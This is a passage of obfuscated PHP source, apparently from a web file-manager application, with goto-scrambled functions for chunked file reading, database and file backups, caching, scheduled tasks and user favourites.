$EñÆˆÓ¤˜‡) / $dƒš·ÓÂ‘) * $dƒš·ÓÂ‘ - $EÀƒ¹ˆÏ‡; $b”ÑœÖŒ© = IO::fileSubstr($this->path, $EÀƒ¹ˆÏ‡, $CƒœØ‰ÙèØ); $a¸Úñ‡à˜[$EÀƒ¹ˆÏ‡ . $a£ø»Í§²æ[33]] = $b”ÑœÖŒ©; goto CìÙ™ğ„Œë; CìÙ™ğ„Œë: ksort($a¸Úñ‡à˜); $b¹‰Èã’Òè = substr($b”ÑœÖŒ©, $B‰ê‡øƒÆ¿ - $EÀƒ¹ˆÏ‡, $EñÆˆÓ¤˜‡); return $b¹‰Èã’Òè; goto d„ºåêóÜ; bùÉğˆ¤°: foreach ($a¸Úñ‡à˜ as $B®³’ïë»« => $Aö‚¤ÒŸ“â) { $B®³’ïë»« = intval($B®³’ïë»«); $EæöŠ²Ä“† = $B®³’ïë»« + strlen($Aö‚¤ÒŸ“â); if ($B‰ê‡øƒÆ¿ >= $EæöŠ²Ä“†) { continue; } if ($B‰ê‡øƒÆ¿ >= $B®³’ïë»« && $B‰ê‡øƒÆ¿ + $EñÆˆÓ¤˜‡ <= $EæöŠ²Ä“†) { return substr($Aö‚¤ÒŸ“â, $B‰ê‡øƒÆ¿ - $B®³’ïë»«, $EñÆˆÓ¤˜‡); } break; } if (count($a¸Úñ‡à˜) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($a£ø»Í§²æ[1319], $a£ø»Í§²æ[1320] . count($a¸Úñ‡à˜) . "\x3b\163\x74\141\x72\x74\75{$B‰ê‡øƒÆ¿}\x2c\x6c\x65\156\147\x74\x68\75{$EñÆˆÓ¤˜‡}\73\x70\157\163\x65\72{$B®³’ïë»«}\176{$EæöŠ²Ä“†}"); throw new Exception($a£ø»Í§²æ[1321]); } $EÀƒ¹ˆÏ‡ = intval($B‰ê‡øƒÆ¿ / $dƒš·ÓÂ‘) * $dƒš·ÓÂ‘; goto cÅ¸®±„¼â; fÓòÒÕˆœ¬: $dƒš·ÓÂ‘ = 64 * 1024; $a¸Úñ‡à˜ =& self::$_chunkBuffer[$this->path]; if (!$a¸Úñ‡à˜) { $a¸Úñ‡à˜ = array(); } goto fÕÃíÈ¸«æ; eˆ‘ø°: $a£ø»Í§²æ =& $_SERVER[ã®Â„Éæ¹¤]; $e§¾“ÚåÊ = $this->info[$a£ø»Í§²æ[77]]; $F«·¼‘Œ” = $B‰ê‡øƒÆ¿; goto A­„ëÉµ°à; d„ºåêóÜ: } private function log($AÁÌ¬ôÁ«, $eêùŠˆŒ†ù) { $f™îºé—ÛÖ =& $_SERVER[ã®Â„Éæ¹¤]; $a¯ƒ…ŠĞÂ = timeFloat() - $this->timeStart; write_log(sprintf($f™îºé—ÛÖ[1322], $AÁÌ¬ôÁ«, $this->info[$f™îºé—ÛÖ[28]], $a¯ƒ…ŠĞÂ, $eêùŠˆŒ†ù), $f™îºé—ÛÖ[1237]); } } goto EƒÔê´ à›; eÒ¬Îœˆ‹ˆ: class BackupDbFile { public function __construct() { } public function index() { goto Eì™Çõß; Cì„Ó£¬­Ÿ: $A¦…ø ôÜî = new TaskFileTransfer($D ëôîòÄ±[751], $D ëôîòÄ±[735], 0, LNG($D ëôîòÄ±[736]) . $D ëôîòÄ±[412] . LNG($D ëôîòÄ±[738]) . $D ëôîòÄ±[752]); $A¦…ø ôÜî->addPath($D¥¡¥Ï‘ÀÍ); $d¢õ‘Íñà = IO::infoWithChildren($D¥¡¥Ï‘ÀÍ); goto Cô†äÁãÁ›; Cô†äÁãÁ›: Backup::set(array($D ëôîòÄ±[753] => $d¢õ‘Íñà[$D ëôîòÄ±[77]])); IO::move($D¥¡¥Ï‘ÀÍ, $BÊ¯¶ŸÁÎŞ); $BÂØ²ù‚Ÿ« = CONTROLLER_DIR . $D ëôîòÄ±[754]; goto eìÛ»İêÂ; F™É»ôæø: $A¦…ø ôÜî->end(); Backup::set(array($D ëôîòÄ±[756] => $d¢õ‘Íñà[$D ëôîòÄ±[77]])); return !0; goto fµÆ´ƒ¶µŞ; Eì™Çõß: $D ëôîòÄ± =& $_SERVER[ã®Â„Éæ¹¤]; $bŠ©†Ãº = Backup::get(); $d¦¤·ššœ = $bŠ©†Ãº[$D ëôîòÄ±[28]]; goto Aè×†ˆ×’; eìÛ»İêÂ: $F¹…ÁÏ« = CONTROLLER_DIR . $D ëôîòÄ±[755]; IO::copy($BÂØ²ù‚Ÿ«, $BÊ¯¶ŸÁÎŞ . "\x62\141\143\x6b\x75\160\137{$d¦¤·ššœ}\57"); IO::copy($F¹…ÁÏ«, $BÊ¯¶ŸÁÎŞ . "\x62\141\143\153\x75\160\137{$d¦¤·ššœ}\57"); goto F™É»ôæø; Aè×†ˆ×’: $D¥¡¥Ï‘ÀÍ = TEMP_FILES . "\142\x61\x63\153\x75\160\137{$d¦¤·ššœ}\x2f"; $BÊ¯¶ŸÁÎŞ = "\x7b\x69\x6f\x3a{$bŠ©†Ãº[$D ëôîòÄ±[713]]}\x7d\57\x64\x61\164\141\x62\141\x73\145\x2f"; IO::mkdir($BÊ¯¶ŸÁÎŞ . "\x62\141\143\x6b\165\x70\137{$d¦¤·ššœ}\57"); goto Cì„Ó£¬­Ÿ; fµÆ´ƒ¶µŞ: } } class BackupFile { public function __construct() { } public function index() { goto D¹Ä÷ä‘²; fÃ·˜õ±ƒ : $dÜë×µ¶Ã¡ = 1000; $BÁ­¼ë½İÖ = $e§ø¨ä ¢Ù = 0; $F¤ô±æ‹‚ = array(); goto e‰ÄØ¯öÍ; Eé¥Å¬Ù²: Backup::set($A¢¯†àéŞÜ); $this->_fileFilter($F¤ô±æ‹‚); return !0; goto DİÖÆ–—ê¹; aŒÆ„×Ğ„Ò: $EªÈƒÉÊÚ‘ = (int) Model($_SERVER[ã®Â„Éæ¹¤][740])->where($DÑØŞšºÅê)->count($_SERVER[ã®Â„Éæ¹¤][419]); $f»¿ö‘Ëâ = (int) Model($_SERVER[ã®Â„Éæ¹¤][740])->where($DÑØŞšºÅê)->sum($_SERVER[ã®Â„Éæ¹¤][77]); $DÜª‚ğÒÒÑ = new TaskFileTransfer($_SERVER[ã®Â„Éæ¹¤][759], $_SERVER[ã®Â„Éæ¹¤][735], $EªÈƒÉÊÚ‘, LNG($_SERVER[ã®Â„Éæ¹¤][736]) . $_SERVER[ã®Â„Éæ¹¤][737] . LNG($_SERVER[ã®Â„Éæ¹¤][760])); goto bæµ—ÉÆ˜; D¹Ä÷ä‘²: $C®äîÀŸÛÕ = Backup::get(); $BÛ±¼é—Š¨ = $C®äîÀŸÛÕ[$_SERVER[ã®Â„Éæ¹¤][281]][$_SERVER[ã®Â„Éæ¹¤][167]][$_SERVER[ã®Â„Éæ¹¤][419]]; $DÑØŞšºÅê = array($_SERVER[ã®Â„Éæ¹¤][420] => array($_SERVER[ã®Â„Éæ¹¤][757], $BÛ±¼é—Š¨), $_SERVER[ã®Â„Éæ¹¤][758] => array($_SERVER[ã®Â„Éæ¹¤][319], $C®äîÀŸÛÕ[$_SERVER[ã®Â„Éæ¹¤][713]])); goto aŒÆ„×Ğ„Ò; c–†‹¹æ¦: $fçë³ëÆ© = !0; $D‡×š’Íˆ = $this->storeIds(); $b½‚¼â¤®Õ = 1; goto fÃ·˜õ±ƒ ; bæµ—ÉÆ˜: $DÜª‚ğÒÒÑ->task[$_SERVER[ã®Â„Éæ¹¤][720]] = $f»¿ö‘Ëâ; $A¢¯†àéŞÜ = array($_SERVER[ã®Â„Éæ¹¤][761] => $EªÈƒÉÊÚ‘, $_SERVER[ã®Â„Éæ¹¤][762] => $f»¿ö‘Ëâ); Backup::set($A¢¯†àéŞÜ); goto c–†‹¹æ¦; e‰ÄØ¯öÍ: $Dòœê¢»òï = $f‚°¦Ì¦‡ª = 0; do { $d›µ¥ë¯“ = $_SERVER[ã®Â„Éæ¹¤][763]; $b¥«£Àèè‚ = Model($_SERVER[ã®Â„Éæ¹¤][740])->where($DÑØŞšºÅê)->field($d›µ¥ë¯“)->order($_SERVER[ã®Â„Éæ¹¤][764])->selectPage($dÜë×µ¶Ã¡, $b½‚¼â¤®Õ); $cÛİ¹”ø¥ª = !empty($b¥«£Àèè‚[$_SERVER[ã®Â„Éæ¹¤][354]]) ? $b¥«£Àèè‚[$_SERVER[ã®Â„Éæ¹¤][354]] : array(); foreach ($cÛİ¹”ø¥ª as $CÃÈ‚âÓ°¶) { goto FÛóÅå½¸Ô; b¶›ŒŠ¼¬: if ($BÁ­¼ë½İÖ >= 1024 * 1024 * 100) { $A¢¯†àéŞÜ = array($_SERVER[ã®Â„Éæ¹¤][770] => $BÛ±¼é—Š¨, $_SERVER[ã®Â„Éæ¹¤][771] => $f‚°¦Ì¦‡ª, $_SERVER[ã®Â„Éæ¹¤][772] => $Dòœê¢»òï); Backup::set($A¢¯†àéŞÜ); $BÁ­¼ë½İÖ = $e§ø¨ä ¢Ù = 0; } goto bÄŠ„Àé; fÓ‘ö®¦À‰: $BÁ­¼ë½İÖ += $CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][77]]; $f‚°¦Ì¦‡ª += 1; $Dòœê¢»òï += $CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][77]]; goto b¶›ŒŠ¼¬; FÛóÅå½¸Ô: if (!$this->_fileExist($CÃÈ‚âÓ°¶, $F¤ô±æ‹‚, $D‡×š’Íˆ)) { $EªÈƒÉÊÚ‘ -= 1; $f»¿ö‘Ëâ -= (int) $CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][77]]; write_log("\146\x69\154\x65\40\x6e\157\x74\40\x65\170\x69\x73\164\x2e\146\151\154\145\111\x44\72{$CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][419]]}\54\40\160\141\x74\150\x3a{$CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][75]]}", $_SERVER[ã®Â„Éæ¹¤][765]); continue; } $fÃŒ„¡«‚» = $CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][75]]; $fŸ‘©Õ‡‰· = "\x7b\x69\157\x3a{$C®äîÀŸÛÕ[$_SERVER[ã®Â„Éæ¹¤][713]]}\x7d" . substr($fÃŒ„¡«‚», strlen("\x7b\x69\157\72{$CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][766]]}\x7d")); goto AÕğ¬é–ø; AÕğ¬é–ø: if (IO::exist($fŸ‘©Õ‡‰·)) { $DÜª‚ğÒÒÑ->updateFileEnd($CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][28]], $CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][77]]); } else { $fŸ‘©Õ‡‰· = get_path_father($fŸ‘©Õ‡‰·); IO::mkdir($fŸ‘©Õ‡‰·); if (!IO::copy($fÃŒ„¡«‚», $fŸ‘©Õ‡‰·, $_SERVER[ã®Â„Éæ¹¤][767])) { write_log($_SERVER[ã®Â„Éæ¹¤][768] . $fÃŒ„¡«‚» . $_SERVER[ã®Â„Éæ¹¤][769] . $fŸ‘©Õ‡‰· . $_SERVER[ã®Â„Éæ¹¤][478], $_SERVER[ã®Â„Éæ¹¤][735]); $fçë³ëÆ© = !1; break; } } $BÛ±¼é—Š¨ = $CÃÈ‚âÓ°¶[$_SERVER[ã®Â„Éæ¹¤][419]]; $e§ø¨ä ¢Ù += 1; goto fÓ‘ö®¦À‰; bÄŠ„Àé: } $EÁİá¶ÅÏÑ = count($cÛİ¹”ø¥ª); $b½‚¼â¤®Õ++; } while ($EÁİá¶ÅÏÑ == $dÜë×µ¶Ã¡); $DÜª‚ğÒÒÑ->end(); goto A‘Ê—ƒİ˜; A‘Ê—ƒİ˜: $cë™¾™›„Ï = $fçë³ëÆ© ? 1 : 0; $A¢¯†àéŞÜ = array($_SERVER[ã®Â„Éæ¹¤][773] => 1, $_SERVER[ã®Â„Éæ¹¤][449] => time(), $_SERVER[ã®Â„Éæ¹¤][730] => $cë™¾™›„Ï, $_SERVER[ã®Â„Éæ¹¤][770] => $BÛ±¼é—Š¨, $_SERVER[ã®Â„Éæ¹¤][762] => $f»¿ö‘Ëâ, $_SERVER[ã®Â„Éæ¹¤][761] => $EªÈƒÉÊÚ‘); if ($e§ø¨ä ¢Ù) { $A¢¯†àéŞÜ[$_SERVER[ã®Â„Éæ¹¤][771]] = $f‚°¦Ì¦‡ª; $A¢¯†àéŞÜ[$_SERVER[ã®Â„Éæ¹¤][772]] = $Dòœê¢»òï; } goto Eé¥Å¬Ù²; DİÖÆ–—ê¹: } private function _fileExist($e˜ÆÕ…Íˆ, &$DøßùØÏš, $C‰ªôÚë¼…) { goto f…ğ»ä…ºÆ; f³ªÅë¸Û§: if (IO::exist($AÜî·‹½)) { $DøßùØÏš[] = $e˜ÆÕ…Íˆ[$bç‡¨Á˜ïÊ[419]]; return !1; } $DÂ›æ•‘Áò = array($bç‡¨Á˜ïÊ[766] => $e˜ÆÕ…Íˆ[$bç‡¨Á˜ïÊ[766]], $bç‡¨Á˜ïÊ[75] => array($bç‡¨Á˜ïÊ[774], "{$AÜî·‹½}\45")); $b“½ğŞŠ‡ = Model($bç‡¨Á˜ïÊ[740])->where($DÂ›æ•‘Áò)->field($bç‡¨Á˜ïÊ[420])->select(); goto b¦£øš‡©Ë; b¦£øš‡©Ë: $DøßùØÏš = array_merge($DøßùØÏš, array_to_keyvalue($b“½ğŞŠ‡, $bç‡¨Á˜ïÊ[33], $bç‡¨Á˜ïÊ[419])); return !1; goto fîÃÎÊ¥Ñ; cÉæ¥ …Ø: if (!in_array($e˜ÆÕ…Íˆ[$bç‡¨Á˜ïÊ[766]], $C‰ªôÚë¼…)) { return !1; } if (IO::exist($D‰¤†Æ‹¦)) { return !0; } $AÜî·‹½ = get_path_father($D‰¤†Æ‹¦); goto f³ªÅë¸Û§; f…ğ»ä…ºÆ: $bç‡¨Á˜ïÊ =& $_SERVER[ã®Â„Éæ¹¤]; $D‰¤†Æ‹¦ = $e˜ÆÕ…Íˆ[$bç‡¨Á˜ïÊ[75]]; if (in_array($e˜ÆÕ…Íˆ[$bç‡¨Á˜ïÊ[419]], $DøßùØÏš)) { return !1; } goto cÉæ¥ …Ø; fîÃÎÊ¥Ñ: } private function _fileFilter($Cè´Õ—Üš‚) { $AˆÌ¤ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($Cè´Õ—Üš‚)) { return; } $BğêÆíœİÂ = array($AˆÌ¤[419] => array($AˆÌ¤[7], array_unique($Cè´Õ—Üš‚))); $d„Àå’¿È = Model($AˆÌ¤[775])->where($BğêÆíœİÂ)->field($AˆÌ¤[369])->select(); foreach ($d„Àå’¿È as $B›­‘‘ŠÑ) { Model($AˆÌ¤[775])->remove($B›­‘‘ŠÑ[$AˆÌ¤[369]], !1); } } private function storeIds() { $eÁò¡°“©é =& $_SERVER[ã®Â„Éæ¹¤]; $C†ã©áÌ†¤ = Model($eÁò¡°“©é[725])->listData(); $e¸÷µÙÉ‰ = array(); $BŒŒ¿³æ¿º = $GLOBALS[$eÁò¡°“©é[6]][$eÁò¡°“©é[84]][$eÁò¡°“©é[776]]; foreach ($C†ã©áÌ†¤ as $cŠ…È½’…Ä) { $cÄ‰¬ÌŞ“ò = strtolower($cŠ…È½’…Ä[$eÁò¡°“©é[90]]); if (!isset($BŒŒ¿³æ¿º[$cÄ‰¬ÌŞ“ò])) { continue; } $d¿šªÒ¶Êå = $eÁò¡°“©é[71] . (isset($BŒŒ¿³æ¿º[$cÄ‰¬ÌŞ“ò]) ? $BŒŒ¿³æ¿º[$cÄ‰¬ÌŞ“ò] : ucfirst($cÄ‰¬ÌŞ“ò)); if (!class_exists($d¿šªÒ¶Êå)) { continue; } $e¸÷µÙÉ‰[] = $cŠ…È½’…Ä[$eÁò¡°“©é[367]]; } return $e¸÷µÙÉ‰; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Cî¦“ğÊ¶; dÃÅÀÕœñ: switch ($F†ƒöâ‚Ë•[$e©­³¼£ƒ×[777]]) { case $e©­³¼£ƒ×[17]: self::$handle = Model($e©­³¼£ƒ×[779]); break; case $e©­³¼£ƒ×[780]: self::$handle = new CacheRedis($a÷ÚÚ£Û, $eÀöÆˆªË‡); break; case $e©­³¼£ƒ×[781]: self::$handle = new CacheMemcached($a÷ÚÚ£Û, $eÀöÆˆªË‡); break; case $e©­³¼£ƒ×[167]: self::$handle = new CacheFile($a÷ÚÚ£Û, $eÀöÆˆªË‡); break; default: break; } return self::$handle; goto aÔùÒ¬…; A¨¶ìåñÎ: $F†ƒöâ‚Ë• = $GLOBALS[$e©­³¼£ƒ×[6]][$e©­³¼£ƒ×[337]]; $a÷ÚÚ£Û = $F†ƒöâ‚Ë•[$F†ƒöâ‚Ë•[$e©­³¼£ƒ×[777]]]; $eÀöÆˆªË‡ = $F†ƒöâ‚Ë•[$e©­³¼£ƒ×[778]]; goto dÃÅÀÕœñ; Cî¦“ğÊ¶: $e©­³¼£ƒ× =& $_SERVER[ã®Â„Éæ¹¤]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto A¨¶ìåñÎ; aÔùÒ¬…: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($FĞƒ½äïö…) { if (is_array($FĞƒ½äïö…) || is_object($FĞƒ½äïö…)) { $FĞƒ½äïö… = json_encode($FĞƒ½äïö…); } $FĞƒ½äïö… = rawurlencode($FĞƒ½äïö…); return md5(KOD_SITE_ID . $_SERVER[ã®Â„Éæ¹¤][70] . $FĞƒ½äïö…); } public static function get($E÷ªŒŸô…) { $eÁ¬¡ã©æÂ = self::key($E÷ªŒŸô…); if (!isset(self::$memoryCache[$eÁ¬¡ã©æÂ])) { $bÆ¯¹ÓºÑŸ = self::init()->get($eÁ¬¡ã©æÂ); self::$memoryCache[$eÁ¬¡ã©æÂ] = unserialize($bÆ¯¹ÓºÑŸ); } return self::$memoryCache[$eÁ¬¡ã©æÂ]; } public static function set($b¤õÏÅ¡ó, $aÇ¶ŞíğÄ, $aØïø•ÒÎô = false) { goto c‰ŠÌ™¨‰ß; F‰Ã¯ÚÉ®°: CacheLock::unlock($b¤õÏÅ¡ó); return $fÖº‚‡‹ŸÑ; goto Cƒ…Øò§µã; c‰ŠÌ™¨‰ß: $fÂ¸‰Ñ‚† = self::key($b¤õÏÅ¡ó); if (isset(self::$memoryCache[$fÂ¸‰Ñ‚†]) && self::$memoryCache[$fÂ¸‰Ñ‚†] === $aÇ¶ŞíğÄ) { return !0; } if ($aØïø•ÒÎô === 0) { self::$memoryCache[$fÂ¸‰Ñ‚†] = $aÇ¶ŞíğÄ; return !0; } goto cÁ˜‰…Â«; cÁ˜‰…Â«: CacheLock::lock($b¤õÏÅ¡ó); $fÖº‚‡‹ŸÑ = self::init()->set($fÂ¸‰Ñ‚†, serialize($aÇ¶ŞíğÄ), $aØïø•ÒÎô); self::$memoryCache[$fÂ¸‰Ñ‚†] = $aÇ¶ŞíğÄ; goto F‰Ã¯ÚÉ®°; Cƒ…Øò§µã: } public static function remove($bÌ‰´’îÊ“) { goto F ô¾é‡½; F ô¾é‡½: $d…ê†¹òƒš = self::key($bÌ‰´’îÊ“); unset(self::$memoryCache[$d…ê†¹òƒš]); self::clearTimeout(); goto e÷ø‹ÏÙ; C™×ô½˜÷ñ: return $Aê¬ÄóÅäÕ; goto B‚Á‚ƒÌ•; e÷ø‹ÏÙ: CacheLock::lock($bÌ‰´’îÊ“); $Aê¬ÄóÅäÕ = self::init()->remove($d…ê†¹òƒš); CacheLock::unlock($bÌ‰´’îÊ“); goto C™×ô½˜÷ñ; B‚Á‚ƒÌ•: } public static function clearMemory($E‹¦¦¿ÒÅô = false) { if ($E‹¦¦¿ÒÅô) { $E‹¦¦¿ÒÅô = self::key($E‹¦¦¿ÒÅô); unset(self::$memoryCache[$E‹¦¦¿ÒÅô]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ã®Â„Éæ¹¤][782])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ã®Â„Éæ¹¤][783])) { self::init()->clearTimeout(); } } } goto D‹£‡ª¨â‹; A•ƒìÒÑñ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\x74\x61\x73\153\x4c\x69\x73\164"; public $field = array("\156\x61\155\x65", "\164\x79\160\145", "\145\x76\x65\x6e\x74", "\164\151\155\145", "\x64\x65\163\143", "\x73\171\163\x74\145\155", "\145\x6e\x61\x62\x6c\x65", "\x6c\141\163\164\122\x75\156", "\163\x6f\162\164"); public function listData($eÎ”íÑ¡æ = false, $fÅàóó„áæ = "\x73\x6f\x72\x74", $B÷Øî—¨²­ = false) { return parent::listData($eÎ”íÑ¡æ, $fÅàóó„áæ, $B÷Øî—¨²­); } public function add($AÑ‚àéÑÏ) { $C¢¨î³ƒÏÓ =& $_SERVER[ã®Â„Éæ¹¤]; $A¼ˆÒÔğ‹» = $this->findByName($AÑ‚àéÑÏ[$C¢¨î³ƒÏÓ[28]]); if ($A¼ˆÒÔğ‹») { return !1; } $AÑ‚àéÑÏ[$C¢¨î³ƒÏÓ[1421]] = 0; $AÑ‚àéÑÏ[$C¢¨î³ƒÏÓ[2149]] = $this->getSort(); return parent::insert($AÑ‚àéÑÏ); } private function getSort() { $C…ù¤¡¬² =& $_SERVER[ã®Â„Éæ¹¤]; $bËƒä¾‘³ = parent::listData(); $Eœß¼õ™ÈÚ = array_to_keyvalue($bËƒä¾‘³, $C…ù¤¡¬²[33], $C…ù¤¡¬²[2149]); return empty($Eœß¼õ™ÈÚ) ? 0 : max($Eœß¼õ™ÈÚ) + 1; } public function update($D¨ÆÁâÕîŠ, $A§¦…˜£±İ) { $AÕŞÌ÷‰ô– =& $_SERVER[ã®Â„Éæ¹¤]; $Dšİ¹‰º³‚ = $this->listData($D¨ÆÁâÕîŠ); $cÒ·ÆÀ§ì = $this->findByName($A§¦…˜£±İ[$AÕŞÌ÷‰ô–[28]]); if (!$Dšİ¹‰º³‚ || $cÒ·ÆÀ§ì && $cÒ·ÆÀ§ì[$AÕŞÌ÷‰ô–[367]] != $Dšİ¹‰º³‚[$AÕŞÌ÷‰ô–[367]]) { return !1; } return parent::update($D¨ÆÁâÕîŠ, $A§¦…˜£±İ); } public function remove($Fòˆ«İ—ìÍ, $C÷³¶İÄã = false) { $A®†Ãö‡Œ =& $_SERVER[ã®Â„Éæ¹¤]; $E‘©ÚŸÑµ = $this->listData($Fòˆ«İ—ìÍ); if (!$E‘©ÚŸÑµ) { return; } if (!$C÷³¶İÄã && $E‘©ÚŸÑµ[$A®†Ãö‡Œ[1099]] == $A®†Ãö‡Œ[83]) { return !1; } return parent::remove($Fòˆ«İ—ìÍ); } public function enable($C©ï¥–¼Ô„, $e¥Š¨›ŒÂ°) { return $this->update($C©ï¥–¼Ô„, array($_SERVER[ã®Â„Éæ¹¤][2527] => $e¥Š¨›ŒÂ°)); } public function run($dâº®„ãÃ) { return $this->update($dâº®„ãÃ, array($_SERVER[ã®Â„Éæ¹¤][2537] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($Cç¤åá‰×) { $a‡ŠÉ–¬‰¯ =& $_SERVER[ã®Â„Éæ¹¤]; return array($a‡ŠÉ–¬‰¯[2223] => array(USER_ID, $a‡ŠÉ–¬‰¯[2538])); } protected function listData() { $EÚ÷–Ğ§…Û =& $_SERVER[ã®Â„Éæ¹¤]; $A«öËº‡ª = array($EÚ÷–Ğ§…Û[1447] => USER_ID, $EÚ÷–Ğ§…Û[436] => 0); $Cà’®ĞÖ = $EÚ÷–Ğ§…Û[2539]; $a¥Ü¡¢±î‡ = $this->field($Cà’®ĞÖ)->where($A«öËº‡ª)->order($EÚ÷–Ğ§…Û[2540])->select(); return $a¥Ü¡¢±î‡ ? $a¥Ü¡¢±î‡ : array(); } protected function resetCache() { } protected function listView() { goto F…ÀÒï­; F…ÀÒï­: $eÄôØ¯´İ¦ =& $_SERVER[ã®Â„Éæ¹¤]; $eÚƒÔóˆƒƒ = $this->listData(); $e•ğìÂ°ˆğ = array_filter_by_field($eÚƒÔóˆƒƒ, $eÄôØ¯´İ¦[29], $eÄôØ¯´İ¦[382]); goto DÔ´«êŠ·‚; aùäå–Œ°™: $fÔë«îÄÎ = array_to_keyvalue($fÔë«îÄÎ, $eÄôØ¯´İ¦[369]); foreach ($eÚƒÔóˆƒƒ as $A®œ¨¿»šå => $bàè¥„‚Çè) { $eõ–ù•Š§• = $fÔë«îÄÎ[$bàè¥„‚Çè[$eÄôØ¯´İ¦[75]]]; $eõ–ù•Š§• = $eõ–ù•Š§• ? $eõ–ù•Š§• : array(); $eÚƒÔóˆƒƒ[$A®œ¨¿»šå] = array_merge($eõ–ù•Š§•, $bàè¥„‚Çè); } return $eÚƒÔóˆƒƒ; goto A£ ¿ñÓ„®; c«ğ‰° ³½: $cŒ¡»ù„¹ = array($eÄôØ¯´İ¦[383] => array($eÄôØ¯´İ¦[384], $fŠêÈ¯À¿)); $fÔë«îÄÎ = Model($eÄôØ¯´İ¦[775])->listSource($cŒ¡»ù„¹, $FÖÌ¶’ƒãˆ); $fÔë«îÄÎ = array_merge($fÔë«îÄÎ[$eÄôØ¯´İ¦[73]], $fÔë«îÄÎ[$eÄôØ¯´İ¦[74]]); goto aùäå–Œ°™; DÔ´«êŠ·‚: $fŠêÈ¯À¿ = array_to_keyvalue($e•ğìÂ°ˆğ, $eÄôØ¯´İ¦[33], $eÄôØ¯´İ¦[75]); if (!$fŠêÈ¯À¿) { return $eÚƒÔóˆƒƒ; } $FÖÌ¶’ƒãˆ = 2000; goto c«ğ‰° ³½; A£ ¿ñÓ„®: } protected function addFav($FÉä ·ïá , $eÎ‰óÂ¾½• = '', $d³öî…Á– = "\163\157\165\x72\x63\145") { goto d¾æ×¿­ò—; dğÛ»«ğÈ: if (!$eÎ‰óÂ¾½• && $d³öî…Á– == $BÖ©ÌˆÜÒ[382]) { $cŸ¡µ¡‡‰ã = Model($BÖ©ÌˆÜÒ[1136])->where(array($BÖ©ÌˆÜÒ[383] => $FÉä ·ïá ))->find(); if (!$cŸ¡µ¡‡‰ã) { return !1; } $eÎ‰óÂ¾½• = $cŸ¡µ¡‡‰ã[$BÖ©ÌˆÜÒ[28]]; } $eÎ‰óÂ¾½• = $this->getAutoName($eÎ‰óÂ¾½•); $eÑñã¡„ë = array($BÖ©ÌˆÜÒ[1447] => USER_ID, $BÖ©ÌˆÜÒ[436] => 0, $BÖ©ÌˆÜÒ[386] => $eÎ‰óÂ¾½•, $BÖ©ÌˆÜÒ[387] => $FÉä ·ïá , $BÖ©ÌˆÜÒ[388] => $d³öî…Á–, $BÖ©ÌˆÜÒ[2131] => $D—°Úè–•› + 1); goto dª‚ä³£¢; D¬¨âÖ¢‚: $c‚Õ‰ÌæºË = array($BÖ©ÌˆÜÒ[1447] => USER_ID, $BÖ©ÌˆÜÒ[436] => 0); $D—°Úè–•› = $this->where($c‚Õ‰ÌæºË)->max($BÖ©ÌˆÜÒ[2149]); if (!$D—°Úè–•›) { $D—°Úè–•› = 0; } goto dğÛ»«ğÈ; dª‚ä³£¢: return $this->add($eÑñã¡„ë); goto cá¶ ÀåÉù; d¾æ×¿­ò—: $BÖ©ÌˆÜÒ =& $_SERVER[ã®Â„Éæ¹¤]; $c‚Õ‰ÌæºË = array($BÖ©ÌˆÜÒ[1447] => USER_ID, $BÖ©ÌˆÜÒ[436] => 0, $BÖ©ÌˆÜÒ[388] => $d³öî…Á–, $BÖ©ÌˆÜÒ[387] => $FÉä ·ïá ); if ($this->where($c‚Õ‰ÌæºË)->find()) { return !1; } goto D¬¨âÖ¢‚; cá¶ ÀåÉù: } protected function remove($eåç…ó×Éä) { $f¬Ûó¥±åÌ =& $_SERVER[ã®Â„Éæ¹¤]; $c•Ä½ù×ô¨ = array($f¬Ûó¥±åÌ[1447] => USER_ID, $f¬Ûó¥±åÌ[385] => $eåç…ó×Éä); return $this->where($c•Ä½ù×ô¨)->delete(); } protected function removeByName($F¢å‹¤ÕŠ¸) { $B’Şõ©”Šˆ =& $_SERVER[ã®Â„Éæ¹¤]; $F™¯ê‹áÕ· = array($B’Şõ©”Šˆ[1447] => USER_ID, $B’Şõ©”Šˆ[386] => $F¢å‹¤ÕŠ¸, $B’Şõ©”Šˆ[436] => 0); return $this->where($F™¯ê‹áÕ·)->delete(); } protected function rename($a†ƒïò¨, $b²¼î¸ÅàÆ) { $E‡Ö¹±‘¬· =& $_SERVER[ã®Â„Éæ¹¤]; if ($a†ƒïò¨ == $b²¼î¸ÅàÆ) { return !1; } $EÃŠŸĞÀË = $this->getAutoName($b²¼î¸ÅàÆ); if ($b²¼î¸ÅàÆ != $EÃŠŸĞÀË) { return !1; } $eìÕ³êøğ = array($E‡Ö¹±‘¬·[1447] => USER_ID, $E‡Ö¹±‘¬·[436] => 0, $E‡Ö¹±‘¬·[28] => $a†ƒïò¨); return $this->where($eìÕ³êøğ)->save(array($E‡Ö¹±‘¬·[28] => $b²¼î¸ÅàÆ)); } protected function resetSort($AéùË¶¾Ê) { $cõ›æ½Æ’³ =& $_SERVER[ã®Â„Éæ¹¤]; $AéùË¶¾Ê = is_array($AéùË¶¾Ê) ? $AéùË¶¾Ê : array(); $cíÛÚ”Ñ = array($cõ›æ½Æ’³[1447] => USER_ID); for ($C¼“¢øŸ× = 0; $C¼“¢øŸ× < count($AéùË¶¾Ê); $C¼“¢øŸ×++) { 